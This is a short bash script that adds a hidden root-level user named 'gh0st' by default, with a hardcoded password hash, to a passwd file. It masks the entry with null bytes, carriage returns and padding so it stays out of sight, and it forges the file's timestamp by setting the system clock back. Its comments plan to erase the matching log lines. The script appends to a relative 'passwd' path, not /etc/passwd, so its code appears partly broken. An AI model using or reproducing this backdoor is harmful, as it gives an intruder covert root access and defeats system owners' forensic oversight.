#!/bin/bash

if [ -w /etc/passwd ]
  then
    echo 'Confirmed write access to /etc/passwd'
    echo '-------------------------------------'
  else
    echo 'You need write permission to /etc/passwd'
    exit 1
fi
if [ -z "$1" ]; then
  echo "Using default username"
  user="gh0st"
  else
    user=$1
fi

if [ -z "$2" ]; then
  echo "Using default password"
  pass='$1$x6SEs7m9$K72xo25oEhzFbRnndGZbu1'
  passText='gh0st'
  else
    passText=$2
    pass=$(openssl passwd -1 $2)
fi

poison="$user:$pass:0:0:root:/root:/bin/bash"
poisonLength=$(echo -n "$poison" | wc -c)
ghostSheet=$(for i in $(seq 1 $poisonLength); do echo -n '\x20'; done)

# Perserve timestamp before doing any modifications to the file
desiredTimestamp=$(/bin/date +%Y-%m-%d%t%H:%M:%S.%s -d "$(/usr/bin/stat -c %x /etc/passwd)")

$(echo -n $poison >> passwd)
$(echo -n -e '\x00\x0d'$ghostSheet'\x0d' >> passwd)

#stealthmode
NOW=$(date)

/bin/date +%Y-%m-%d%t%H:%M:%S.%s -s "$desiredTimestamp" 2&>/dev/null && touch passwd && /bin/date -s "$NOW" 2&>/dev/null

# Check logfiles for clues....


# For CentOS:
# /var/log/messages, grep for these and sed away??

# Feb 24 06:32:46 centos7 systemd: Time has been changed
# Aug 15 14:30:11 centos7 systemd: Time has been changed

# use timedatectl to determine if ntp is active, for when setting time back?
# timedatectl set-ntp off && timedatectl set-ntp on

echo "All done. Added local ghost user: $user with password: $passText to passwd file!"